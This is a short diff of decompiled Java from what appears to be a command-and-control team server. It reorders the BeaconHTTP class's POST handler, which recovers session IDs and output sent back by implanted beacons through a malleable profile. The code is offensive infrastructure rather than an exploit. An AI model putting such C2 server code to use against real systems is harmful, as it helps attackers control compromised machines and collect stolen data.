@@ -56,41 +56,6 @@ public class BeaconHTTP {
       }
    }
 
-   private class _B implements MalleableHook.MyHook {
-      private _B() {
-      }
-
-      public byte[] serve(String var1, String var2, Properties var3, Properties var4) {
-         try {
-            String var5 = "";
-            String var6 = ServerUtils.getRemoteAddress(BeaconHTTP.this.c2profile, var3);
-            String var7 = BeaconHTTP.this.getPostedData(var4);
-            var5 = new String(BeaconHTTP.this.c2profile.recover(".http-post.client.id", var3, var4, var7, var1));
-            if (var5.length() == 0) {
-               CommonUtils.print_error("HTTP " + var2 + " to " + var1 + " from " + var6 + " has no session ID! This could be an error (or mid-engagement change) in your c2 profile");
-               MudgeSanity.debugRequest(".http-post.client.id", var3, var4, var7, var1, var6);
-            } else if (!CommonUtils.isNumber(var5)) {
-               CommonUtils.print_error("HTTP " + var2 + " to " + var1 + " from " + var6 + " has corrupt session ID '" + var5 + "'! This could be an error (or mid-engagement change) in your c2 profile");
-               MudgeSanity.debugRequest(".http-post.client.id", var3, var4, var7, var1, var6);
-            } else {
-               byte[] var8 = CommonUtils.toBytes(BeaconHTTP.this.c2profile.recover(".http-post.client.output", var3, var4, var7, var1));
-               if (var8.length == 0 || !BeaconHTTP.this.controller.process_beacon_data(var5, var8)) {
-                  MudgeSanity.debugRequest(".http-post.client.output", var3, var4, var7, var1, var6);
-               }
-            }
-         } catch (Exception var9) {
-            MudgeSanity.logException("beacon post handler", var9, false);
-         }
-
-         return BeaconHTTP.this.datajitter == 0 ? new byte[0] : CommonUtils.randomData(CommonUtils.rand(BeaconHTTP.this.datajitter));
-      }
-
-      // $FF: synthetic method
-      _B(Object var2) {
-         this();
-      }
-   }
-
    private class _A implements MalleableHook.MyHook {
       private _A() {
       }
@@ -129,8 +94,41 @@ public class BeaconHTTP {
          }
       }
 
-      // $FF: synthetic method
       _A(Object var2) {
+         this();
+      }
+   }
+
+   private class _B implements MalleableHook.MyHook {
+      private _B() {
+      }
+
+      public byte[] serve(String var1, String var2, Properties var3, Properties var4) {
+         try {
+            String var5 = "";
+            String var6 = ServerUtils.getRemoteAddress(BeaconHTTP.this.c2profile, var3);
+            String var7 = BeaconHTTP.this.getPostedData(var4);
+            var5 = new String(BeaconHTTP.this.c2profile.recover(".http-post.client.id", var3, var4, var7, var1));
+            if (var5.length() == 0) {
+               CommonUtils.print_error("HTTP " + var2 + " to " + var1 + " from " + var6 + " has no session ID! This could be an error (or mid-engagement change) in your c2 profile");
+               MudgeSanity.debugRequest(".http-post.client.id", var3, var4, var7, var1, var6);
+            } else if (!CommonUtils.isNumber(var5)) {
+               CommonUtils.print_error("HTTP " + var2 + " to " + var1 + " from " + var6 + " has corrupt session ID '" + var5 + "'! This could be an error (or mid-engagement change) in your c2 profile");
+               MudgeSanity.debugRequest(".http-post.client.id", var3, var4, var7, var1, var6);
+            } else {
+               byte[] var8 = CommonUtils.toBytes(BeaconHTTP.this.c2profile.recover(".http-post.client.output", var3, var4, var7, var1));
+               if (var8.length == 0 || !BeaconHTTP.this.controller.process_beacon_data(var5, var8)) {
+                  MudgeSanity.debugRequest(".http-post.client.output", var3, var4, var7, var1, var6);
+               }
+            }
+         } catch (Exception var9) {
+            MudgeSanity.logException("beacon post handler", var9, false);
+         }
+
+         return BeaconHTTP.this.datajitter == 0 ? new byte[0] : CommonUtils.randomData(CommonUtils.rand(BeaconHTTP.this.datajitter));
+      }
+
+      _B(Object var2) {
          this();
       }
    }
